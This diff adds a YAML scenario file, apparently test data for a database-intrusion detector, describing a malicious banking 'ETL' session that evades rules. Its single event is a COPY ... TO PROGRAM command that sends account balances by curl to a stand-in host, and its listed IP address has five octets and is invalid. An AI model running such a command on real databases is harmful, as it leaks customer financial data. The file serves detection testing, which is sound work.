@@ -1,0 +1,21 @@
+scenario_id: gen_banking_00_copy_to_program_mal_11
+family_id: gen_banking_00_copy_to_program_mal_fam11
+domain: banking
+time_of_day: 00:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT balance FROM accounts) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.125.42
+      port: 8443
